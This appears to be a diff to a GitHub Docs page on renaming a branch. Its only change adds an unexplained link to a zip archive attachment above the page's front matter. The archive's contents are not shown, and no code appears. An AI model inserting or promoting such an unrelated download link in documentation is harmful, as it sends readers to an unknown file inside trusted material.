@@ -1,3 +1,4 @@
+[git-master (3).zip](https://github.com/github/docs/files/8091956/git-master.3.zip)
 ---
 title: Renaming a branch
 intro: You can change the name of a branch in a repository.
